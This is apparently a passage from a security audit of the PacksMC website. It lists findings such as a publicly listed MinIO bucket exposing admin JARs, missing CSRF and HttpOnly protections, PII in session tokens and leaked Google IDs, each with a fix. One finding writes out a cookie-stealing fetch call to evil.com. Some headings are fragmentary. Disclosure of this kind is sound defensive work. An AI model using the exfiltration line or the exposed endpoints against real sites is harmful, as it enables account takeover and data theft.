1
MinIO S3 Bucket — Full Public Listing (NO AUTH)
Endpoint
GET https://minio.packsmc.com/packsmc/
Issue
MinIO bucket has public listing enabled with zero auth. XML ListBucketResult returns ALL files: filenames, sizes, ETags, timestamps, and MinIO owner ID hash (02d6176d...). Admin JAR files at mod-files/admin/packsmc-1.0.0-*.jar can be downloaded and decompiled.
Impact
Admin plugin source code theft → reverse-engineer backend exploits. All user banners, community icons, pack screenshots with UUIDs exposed. Complete storage infrastructure mapped.
Fix
Set bucket policy to private. Serve files via authenticated proxy. Move admin JARs out of public bucket.

Endpoint

Issue

18
No CSRF Protection — Cross-Site Account Action Forgery
Endpoint
All POST/PUT/DELETE endpoints (pack upload, settings, reports, profile changes)
Issue
No CSRF tokens present on any forms or API calls. SameSite cookie attribute not strictly enforced. State-changing operations accept cross-origin requests without verification.
Impact
Attacker crafts malicious page → victim visits → auto-submits requests on victim's behalf → modify account settings, upload malicious packs, delete content, change linked accounts — all without victim's knowledge or consent.
Fix
Implement CSRF tokens on all state-changing endpoints. Set SameSite=Strict on session cookies. Use double-submit cookie pattern.
19
Session Token Contains Decodable User PII (JWT Payload)
Endpoint
All authenticated sessions — __Secure-better-auth.session_token
Issue
Better Auth session token is a base64-encoded JWT whose payload contains user email, display name, internal UUID, and account role in plaintext. Any party with access to the cookie value (XSS, network interception, browser extension) can decode and extract full PII without needing server-side access.
Impact
Chain with XSS (#16) → steal session cookie → base64 decode JWT → extract real email, name, UUID, role. Full de-anonymization + account impersonation for every logged-in user.
Fix
Use opaque session tokens (random strings) instead of JWTs. Store session data server-side only. Ensure HttpOnly + Secure + SameSite=Strict flags on all auth cookies.

Issue

Restrict CORS to packsmc.com domains only. Remove wildcard * origin. Validate Origin header server-side. Set Access-Control-Allow-Credentials: false.

31
Better Auth Session Token Accessible via JavaScript (Missing HttpOnly)
Endpoint
All authenticated pages — cookie __Secure-better-auth.session_token
Issue
The __Secure-better-auth.session_token cookie is missing the HttpOnly flag. This means the session token is fully accessible via document.cookie in JavaScript. Any XSS vulnerability (e.g., #16) can directly read and exfiltrate the session token to an attacker-controlled server.
Impact
Instant full account takeover from any XSS. Attacker steals session token via fetch('https://evil.com/steal?t='+document.cookie) → impersonate victim, access all data, upload malicious packs, modify account. Affects every logged-in user who triggers any XSS payload.
Fix
Set HttpOnly flag on all authentication cookies in Better Auth config. This prevents JavaScript from accessing the cookie entirely, breaking the XSS → token theft chain. Also set Secure and SameSite=Strict.
32
Google Account ID + OAuth Scopes Leaked via Profile API
Endpoint
GET /api/user/{username} and authentication callback responses
Issue
User profile API responses expose the user's raw Google Account ID (numeric identifier) and the OAuth permission scopes granted during registration (email, profile, openid). This data is returned for any user without authentication — not just the requesting user's own profile.
Impact
Complete real-identity exposure: Google Account ID → lookup real name, email, profile photo, YouTube channel, Google reviews, and all linked services. OAuth scopes reveal exactly what data PacksMC can access from the user's Google account — enabling targeted OAuth phishing attacks that mimic PacksMC's permission requests.
Fix
Never expose Google Account ID or OAuth scopes in any public API response. Use internal opaque IDs only. Store OAuth metadata server-side exclusively. Strip all provider-specific identifiers from client-facing responses.
33
Hotjar Session Recordings on Login/Payment Pages — Credential Capture
Endpoint
All pages — Hotjar tracking script active globally including /auth/sign-in, /settings/security, and payment flows
Issue
Hotjar session recording is active on ALL pages with no exclusions for sensitive routes. This means Hotjar captures full mouse movements, clicks, scrolls, and potentially keystrokes on login pages, security settings, and payment forms. Session replays are stored on Hotjar's infrastructure (third-party).
Impact
If Hotjar is compromised or an employee accesses recordings: mass credential theft from login page recordings. Payment card details potentially captured during checkout. Session recordings also expose user browsing patterns, private pack interactions, and admin panel usage. Violates PCI-DSS if payment data is captured.
Fix
Exclude sensitive pages from Hotjar recording: /auth/*, /settings/*, /admin/*, and all payment routes. Use Hotjar's suppress attribute on password/email input fields. Enable Hotjar's built-in PII masking. Audit recording scope for GDPR compliance.
